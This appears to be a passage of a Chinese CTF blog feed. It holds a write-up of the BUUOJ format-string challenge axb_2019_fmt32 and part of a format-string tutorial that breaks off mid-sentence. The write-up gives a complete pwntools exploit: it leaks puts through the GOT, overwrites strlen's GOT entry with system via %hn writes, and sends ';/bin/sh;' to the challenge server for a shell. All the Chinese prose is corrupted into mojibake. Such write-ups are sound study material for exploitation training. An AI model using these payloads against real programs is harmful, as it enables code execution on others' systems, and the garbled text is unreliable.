class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Hello,I am a computer Repeater updated.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So I&#x27;ll answer whatever you say!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="keyword">sizeof</span>(format));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="built_in">sprintf</span>(format, <span class="string">&quot;Repeater:%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what you input is really long!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯»æ‰¾å­—ç¬¦ä¸²å¹¶æ²¡æœ‰å‘ç°<code>flag</code>,<code>/bin/sh</code>ç­‰å­—çœ¼ï¼Œpltè¡¨ä¹Ÿæ²¡æœ‰è£…è½½<code>system</code>å‡½æ•°ï¼Œé‚£å°±åˆ†æmainå‡½æ•°ï¼Œä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´<code>printf(format);</code> <code>format</code>æ˜¯ç”±æˆ‘ä»¬æ§åˆ¶çš„ï¼Œé¦–å…ˆæ¸…æ¥šä¸€ç‚¹ï¼Œç¨‹åºé‡‡å–readå‡½æ•°è¯»å–æˆ‘ä»¬çš„è¾“å…¥ï¼Œå¤§å°å¡çš„ä¹Ÿå¾ˆæ­»ï¼Œæ— æ³•æº¢å‡ºã€‚</p><h3 id="æ³„éœ²libcåœ°å€çš„å‡†å¤‡"><a href="#æ³„éœ²libcåœ°å€çš„å‡†å¤‡" class="headerlink" title="æ³„éœ²libcåœ°å€çš„å‡†å¤‡"></a>æ³„éœ²libcåœ°å€çš„å‡†å¤‡</h3><p>é‚£ä¹ˆæˆ‘ä»¬ç¬¬ä¸€æ­¥è‚¯å®šä¹Ÿæ˜¯æ³„éœ²libcçš„åœ°å€ï¼Œä¸èƒ½æº¢å‡ºé‚£å°±ä¸èƒ½æ„é€ ropé“¾å»è¾“å‡ºï¼Œåªèƒ½ç”¨ç¨‹åºæœ¬èº«çš„printfå»è¾“å‡ºã€‚æˆ‘ä»¬ç›®å‰èƒ½ç¡®å®šçš„åªæœ‰libcå‡½æ•°gotè¡¨åœ°å€ï¼Œè€Œgotè¡¨åœ°å€çš„å€¼è£…çš„æ‰æ˜¯libcå‡½æ•°çš„åœ°å€ã€‚é€šä¿—ç‚¹è®²æˆ‘ç°åœ¨çŸ¥é“ä¸€ä¸ªåœ°å€ï¼Œä½†æ˜¯æˆ‘è¦çš„æ˜¯è¿™ä¸ªåœ°å€çš„å€¼ã€‚<code>%d %x %f</code>é‚£äº›éƒ½æ˜¯ä½ ä¼ ä»€ä¹ˆå°±è¾“å‡ºä»€ä¹ˆã€‚ä¸¾ä¸ªä¾‹å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">0xdeadbeef</span>;</span><br><span class="line"><span class="comment">//å‡è®¾&amp;a=0x61616161</span></span><br><span class="line"><span class="keyword">int</span> b=&amp;a;</span><br></pre></td></tr></table></figure><p>å½“çƒ­è¿™ç§å†™æ³•æ˜¯é”™çš„ï¼Œä½†æ˜¯é€»è¾‘åº”è¯¥éƒ½èƒ½ç†è§£çš„ã€‚å¦‚æœæˆ‘çŸ¥é“bçš„å€¼äº†ï¼Œé‚£ä¹ˆæˆ‘å¦‚ä½•çŸ¥é“bçš„å€¼æ‰€ä»£è¡¨çš„åœ°å€çš„å€¼å‘¢ï¼Œå¦‚æœ<code>printf(&quot;%d&quot;,b);</code>çš„è¯ï¼Œé‚£ä¹ˆä½ åªèƒ½å¾—åˆ°<code>0x61616161</code>è€Œå¾—ä¸åˆ°ä½ æƒ³è¦çš„<code>0xdeadbeef</code>ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦æåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹äº†:å­—ç¬¦ä¸²ä¼ å‚ï¼Œæˆ‘åœ¨ä¹‹å‰çš„åšå®¢åº”è¯¥ä¹Ÿæœ‰æ‰€è®²è¿‡ï¼Œå­—ç¬¦ä¸²ä¼ å‚æ˜¯ç”¨æŒ‡é’ˆä¼ çš„ã€‚å› ä¸ºå­—ç¬¦ä¸²æ˜¯å¤§ç«¯åºï¼Œæ‰€ä»¥ä¸€ä¸ªæŒ‡é’ˆçš„å­—ç¬¦ä¸²åˆ¤å®šæ˜¯ä»è¿™ä¸ªæŒ‡é’ˆå¼€å§‹ä¸€ç›´åˆ°ä¸‹ä¸€ä¸ª<code>&#39;\0&#39;</code>å­—èŠ‚(å‘é«˜åœ°å€)ä¸ºè¿™ä¸ªæŒ‡é’ˆä»£è¡¨çš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">value:  00 41 42 43 44 45 43 41 00</span><br><span class="line">address:00 01 02 03 04 05 06 07 08</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆ04å­—ç¬¦ä¸²å°±æ˜¯<code>deca</code></p><p>03å­—ç¬¦ä¸²å°±æ˜¯<code>cdeca</code></p><p>ä»¥æ­¤ç±»æ¨ã€‚ã€‚ã€‚</p><p>é‚£ä¹ˆå­—ç¬¦ä¸²å°±æˆäº†æ³„éœ²libcåœ°å€çš„æœ‰åˆ©å·¥å…·ï¼Œ<code>printf(&quot;%s&quot;,b);</code>å°±å¯ä»¥æ³„éœ²libcå‡½æ•°çš„åœ°å€äº†ã€‚</p><h3 id="ç¡®å®šåç§»æ³„éœ²libcå¯»æ‰¾systemå‡½æ•°åœ°å€"><a href="#ç¡®å®šåç§»æ³„éœ²libcå¯»æ‰¾systemå‡½æ•°åœ°å€" class="headerlink" title="ç¡®å®šåç§»æ³„éœ²libcå¯»æ‰¾systemå‡½æ•°åœ°å€"></a>ç¡®å®šåç§»æ³„éœ²libcå¯»æ‰¾systemå‡½æ•°åœ°å€</h3><p>ç¡®å®šåç§»ä»æ¥æ˜¯çœ‹ä¸å‡ºæ¥çš„ï¼Œè¦è‡ªå·±åŠ¨è°ƒå»ç¡®å®šåç§»ï¼Œç›´æ¥è¿è¡Œä¼šå‘ç°æœ‰æ—¶é’Ÿæ§åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬gdbè°ƒè¯•ï¼Œåœ¨readå’Œprintfå‡½æ•°éƒ½ä¸‹æ–­ç‚¹ï¼Œè¾“å…¥<code>aaaa%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x</code></p><p>å¾—åˆ°ç»“æœï¼š</p><p><img src="https://i.loli.net/2021/06/08/LxJ63SAr1KdH9qb.png" alt="buuoj axb_2019_fmt32_1.png"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„4ä¸ªaåœ¨printfé‡Œé¢è¢«åˆ†å‰²äº†ï¼Œç¬¬8ä¸ªå‚æ•°æœ‰3ä¸ªa(0x61)ï¼Œç¬¬7ä¸ªå‚æ•°æœ‰1ä¸ªï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠç¬¬ä¸ƒä¸ªå‚æ•°å¡«å……å®Œæ•´ä¹‹åå†åœ¨ç¬¬å…«ä¸ªå‚æ•°çš„ä½ç½®æ”¾ä¸Šlibcå‡½æ•°çš„gotè¡¨åœ°å€ï¼Œç„¶ååœ¨æœ€ååŠ ä¸Š<code>%8$s</code>å°±å¯ä»¥æ³„éœ²libcåœ°å€äº†ã€‚</p><p>è¿™é‡Œæˆ‘é€‰æ‹©æ³„éœ²<code>puts</code>å‡½æ•°çš„åœ°å€</p><p>ç¬¬ä¸€æ¬¡payloadå°±æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;%8$s\0s&#x27;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºè¾“å‡ºä¸å•å•åªæ˜¯è¾“å‡ºpayloadï¼Œè¿˜åŠ äº†å¾ˆå¤šjunkæ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è€ƒè™‘åœ¨è¾“å‡ºä¹‹å‰åŠ ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦<code>&#39;\n&#39;</code>é‚£ä¹ˆ æˆ‘ä»¬åœ¨<code>p.recvuntil(b&#39;\n&#39;)</code>ä¹‹åæ¥æ”¶çš„å››ä¸ªå­—èŠ‚ä¸€å®šå°±æ˜¯putsçš„çœŸå®åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;\n%8$s\0s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]puts_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys)))</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±å¾ˆè½»æ¾åœ°å¾—åˆ°äº†<code>system()</code>å‡½æ•°çš„åœ°å€</p><h3 id="ç¡®å®šæ”»å‡»æ€è·¯"><a href="#ç¡®å®šæ”»å‡»æ€è·¯" class="headerlink" title="ç¡®å®šæ”»å‡»æ€è·¯"></a>ç¡®å®šæ”»å‡»æ€è·¯</h3><p>æˆ‘ä»¬ä¸éœ€è¦æ³„éœ²<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œå› ä¸ºä¹‹å‰å°±è¯´äº†ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½æ ˆæº¢å‡ºåŠ«æŒç¨‹åºæ§åˆ¶æµï¼Œå› æ­¤è¦è€ƒè™‘å…¶å®ƒæ–¹æ³•ï¼Œprintfå¯ä»¥ä»»æ„å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¿®æ”¹gotè¡¨çš„å†…å®¹ï¼Œå¦‚æœæŠŠstrlenå‡½æ•°çš„gotè¡¨æ”¹æˆsystemçš„åœ°å€ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨strlençš„æ—¶å€™å°±ä¼šæ‰§è¡Œsystemå‡½æ•°äº†ã€‚ç”¨printfå‡½æ•°åº”è¯¥ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯äººå®¶æ”¹çš„æ—¶å€™å°±æ˜¯åœ¨æ‰§è¡Œprintfï¼Œæ‰€ä»¥ç»™äº†ä½ strlenå°±å¼€å¼€å¿ƒå¿ƒç”¨å˜›å¯¹å§ã€‚</p><p>ç”±äºä¸€ä¸ªåœ°å€çš„å€¼æ¯”è¾ƒå¤§ï¼Œä¸€æ¬¡è¦†ç›–è¦è¾“å‡ºæœ€å¤šå¯èƒ½è¾“å‡º<code>0xffffffff</code>å››åå¤šäº¿ä¸ªå­—ç¬¦ï¼Œæœ€å°‘ä¹Ÿæ˜¯<code>0xf7000000</code>ä¸ªå­—ç¬¦ã€‚æ‰€ä»¥æˆ‘ä»¬é‡‡å–åˆ†æ¬¡èµ‹å€¼ï¼ŒæŠŠè¿™ä¸ªåœ°å€åˆ†æˆé«˜å­—å’Œä½å­—ï¼Œè¿™æ ·ä¸€æ¬¡æœ€å¤šè¾“å‡º<code>0xffff</code>å…­ä¸‡å¤šä¸ªå­—ç¬¦ï¼Œåœ¨å¯æ¥å—çš„èŒƒå›´å†…ï¼Œæˆ‘ä»¬å¿…é¡»è¦ä¸€æ¬¡èµ‹å€¼èµ‹å®Œï¼Œå¦åˆ™åªèµ‹ä¸€åŠå°±åœï¼Œä¸‹é¢æ‰§è¡Œstrlenå‡½æ•°å°±ä¸åœ¨é¢„æœŸä¹‹å†…ï¼Œä¼šå¼•å‘è¯¸å¤šé”™è¯¯ï¼Œæ‰€ä»¥è¦æ”¹gotè¡¨å¾—ä¸€æ¬¡æ”¹å®Œã€‚å› ä¸ºlibcçš„åŸºå€ä¸€èˆ¬éƒ½æ˜¯0xf7å¼€å¤´çš„ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°é«˜å­—è‚¯å®šæ¯”è¾ƒå¤§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å…ˆèµ‹ä½å­—ï¼Œåœ¨èµ‹é«˜å­—ï¼Œç¼ºçš„å­—ç¬¦ä¸­é—´ç®—ç®—å·®å€¼è¡¥è¶³å°±å¥½äº†ã€‚</p><p>è¿™é‡Œåˆè¦ä»‹ç»ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ ‡è¯†ç¬¦äº†</p><p><code>%n$hn</code>ç»™ç¬¬nä¸ªå‚æ•°åœ°å€èµ‹å€¼å½“å‰å·²æ‰“å°å­—ç¬¦çš„ä¸ªæ•°(å¤§å°ä¸ºä¸€ä¸ªå­—(word))ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ç²¾å¿ƒæ„é€ payloadäº†ï¼Œæ³¨æ„è¾“å‡ºä¸æ­¢ä¸€ä¸ªpayloadï¼Œè¿˜è¦æ³¨æ„å‰é¢çš„ä¸€äº›junkï¼Œç»è¿‡è®¡ç®—ï¼Œpayloadå¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(strlen_got)+p32(strlen_got+<span class="number">2</span>)+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_low-<span class="number">18</span>).encode()+<span class="string">b&#x27;c%8$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_high-sys_low).encode()+<span class="string">b&#x27;c%9$hn&#x27;</span></span><br></pre></td></tr></table></figure><p>æœ€åä¸€æ­¥å°±æ˜¯ç»™<code>/bin/sh</code>å­—ç¬¦ä¸²äº†ï¼Œç¬¬ä¸‰æ¬¡è¾“å…¥å¾ˆç®€å•ï¼Œç›´æ¥ç»™<code>;/bin/sh;</code>å³å¯ï¼Œåˆ†å·ç”¨äºè¿‡æ»¤å‰é¢çš„junkæ•°æ®ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">proc=<span class="string">&#x27;./axb_2019_fmt32&#x27;</span></span><br><span class="line"><span class="comment">#p=process(proc)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25544</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(proc)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">strlen_got=elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;\n%8$s\0s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]puts_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys)))</span><br><span class="line">sys_high=(sys&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">sys_low=sys&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_low:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_low)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_high:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_high)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(strlen_got)+p32(strlen_got+<span class="number">2</span>)+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_low-<span class="number">18</span>).encode()+<span class="string">b&#x27;c%8$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_high-sys_low).encode()+<span class="string">b&#x27;c%9$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨</title>
      <link href="/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/"/>
      <url>/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ˜¯printfå‡½æ•°æ¯”è¾ƒå¸¸è§çš„æ¼æ´ï¼Œå¸¸è§çš„æ¼æ´å½¢å¼å°±æ˜¯<code>printf(s);</code>å¦‚æœså­—ç¬¦æ˜¯æˆ‘ä»¬å¯æ§çš„è¯ï¼Œé‚£å°±ä¼šå¯¼è‡´ä»»æ„ä½ç½®è¯»å’Œå†™ç­‰ä¸¥é‡çš„åæœã€‚</p><span id="more"></span><p>é¦–å…ˆå¦‚ä¸‹ä»£ç æ®µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">gets(s);</span><br><span class="line"><span class="built_in">printf</span>(s);</span><br></pre></td></tr></table></figure><p>é€»è¾‘çœ‹ä¸Šå»ååˆ†ç®€å•ï¼Œå°±æ˜¯è¾“å…¥ä»€ä¹ˆå°±è¾“å‡ºä»€ä¹ˆã€‚é¿å…è¿™ç±»æ¼æ´çš„æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œå›ºå®šç¬¬ä¸€ä¸ªå‚æ•°å°±å¯ä»¥äº†ï¼Œä½†æ˜¯ç°åœ¨ç¬¬ä¸€ä¸ªå‚æ•°æˆ‘ä»¬å¯æ§çš„è¯å°±è¦ä»‹ç»ä¸€äº›å¹³æ—¶ç”¨ä¸åˆ°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ‡è¯†ç¬¦äº†ã€‚</p><p><code>%d %f %x %s</code>è¿™äº›çƒ‚å¤§è¡—çš„ç›¸ä¿¡éƒ½ä¸ç”¨è®²ä¹Ÿä¼šï¼Œè®²è®²å…¶å®ƒçš„æ ‡è¯†ç¬¦</p><p><code>%p</code>:è¾“å‡ºç¬¬nä¸ªå‚æ•°çš„åå…­è¿›åˆ¶å€¼ï¼Œç›®å‰æµ‹è¯•ä¸<code>%x</code>ä¸ä¸€æ ·çš„åœ°æ–¹å°±æ˜¯è¾“å‡ºä¼šå¸¦<code>0x</code>ï¼Œå¹¶ä¸”%åé¢å¸¦çš„æ•´å‹å‚æ•°è¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°è€Œéå‚æ•°é•¿åº¦ã€‚</p><p><code>%n</code>:å°†å·²æ‰“å°å­—ç¬¦ä¸²é•¿åº¦è¾“å…¥åˆ°ä¸‹ä¸€ä¸ªå‚æ•°æ‰€è¡¨ç¤ºçš„åœ°å€å»ï¼Œ%åé¢å¸¦çš„æ•´å‹å‚æ•°è¡¨ç¤ºè¦è¾“å‡ºçš„ç¬¬å‡ ä¸ªå‚æ•°ã€‚</p><p>æ³¨ï¼šä»¥ä¸Šç»“è®ºçš†æ˜¯åœ¨Ubuntu18.0.4ç¯å¢ƒä¸‹ä½¿ç”¨gccç¼–è¯‘å™¨å¾—åˆ°çš„</p><p>é‚£ä¹ˆé€šè¿‡ä»¥ä¸Šä¸¤ä¸ªè¾ƒç”Ÿåƒ»æ ¼å¼åŒ–çš„æ ‡è¯†ç¬¦å°±å¯ä»¥è¾¾åˆ°ä»»æ„è¯»å’Œä»»æ„å†™äº†ã€‚</p><h2 id="pè¾¾åˆ°ä»»æ„è¯»çš„ç›®çš„"><a href="#pè¾¾åˆ°ä»»æ„è¯»çš„ç›®çš„" class="headerlink" title="%pè¾¾åˆ°ä»»æ„è¯»çš„ç›®çš„"></a>%pè¾¾åˆ°ä»»æ„è¯»çš„ç›®çš„</h2><p>ç°åœ¨æœ‰ä»¥ä¸‹æµ‹è¯•ç¨‹åº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">while</span>(buf[<span class="number">0</span>]!=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        gets(buf);</span><br><span class="line">        <span class="built_in">printf</span>(buf,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬åœ¨64ä½çš„ç¯å¢ƒä¸‹ç¼–è¯‘ï¼Œæ‰€ä»¥åˆšå¥½ç»™6ä¸ªå‚æ•°å æ»¡å¯„å­˜å™¨ï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘è¾“å…¥ä¸€ä¸ª<code>%6$p</code>å°±å¯ä»¥ç›´æ¥è¾“å‡º<code>%6$p</code>è¿™ä¸ªå­—ç¬¦ä¸²æ‰€å¯¹åº”çš„<code>long</code>çš„å€¼(å› ä¸º64ä½æ ˆçš„å®½åº¦ä¸º8å­—èŠ‚ï¼Œæ‰€ä»¥è¢«è¿«è¾“å‡ºlongå‹æ•´æ•°)</p><p><img src="https://i.loli.net/2021/06/05/eWljw5DEnZ9b1gm.png" alt="format string_1.png"></p><p>è¿™é‡Œå¯ä»¥å¾ˆæ¸…æ¥šçœ‹åˆ°<code>70243625</code>å°±æ˜¯å­—ç¬¦ä¸²<code>%6$p</code>å°ç«¯è¾“å‡ºçš„ç»“æœï¼Œå¦‚æœé‡ä¸€ä¸‹ç¼“å†²åŒºåˆ°rbpçš„è·ç¦»æˆ‘ä»¬è¿˜å¯ä»¥æŠŠæ ˆçš„åœ°å€æ³„éœ²å‡ºæ¥ï¼Œè¿™å°±æ˜¯ä»»æ„è¯»ï¼Œåœ°å€ä¸€æ—¦æ³„éœ²é‚£ä¹ˆå¯ä»¥åšçš„äº‹æƒ…å°±éå¸¸å¤šäº†ï¼Œå¦‚æœåŠ äº†canaryç”šè‡³å¯ä»¥æ— è§†canaryæº¢å‡ºã€‚</p><h2 id="nè¾¾åˆ°ä»»æ„å†™ç›®çš„"><a href="#nè¾¾åˆ°ä»»æ„å†™ç›®çš„" class="headerlink" title="%nè¾¾åˆ°ä»»æ„å†™ç›®çš„"></a>%nè¾¾åˆ°ä»»æ„å†™ç›®çš„</h2><p>æˆ‘ä»¬çš„æµ‹è¯•ç¨‹åºæ˜¯è¿™æ ·å†™çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>,c=<span class="number">0</span>,d=<span class="number">0</span>,e=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(buf[<span class="number">0</span>]!=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        gets(buf);</span><br><span class="line">        <span class="built_in">printf</span>(buf,&amp;a,&amp;b,&amp;c,&amp;d,&amp;e);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%d %d %d %d %d\n&quot;</span>,a,b,c,d,e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªæµ‹è¯•ç¨‹åºç•¥å¾®åŒ–ç®€äº†ä¸€ç‚¹ï¼Œè¦ä¿®æ”¹çš„å˜é‡åœ°å€ç›´æ¥ä¼ å‚è¿›å»äº†ï¼Œåœ¨å®é™…æ”»å‡»çš„è¿‡ç¨‹ä¸­å¯ä¸ä¼šè¿™ä¹ˆç»™ä½ æä¾›ï¼Œä½ 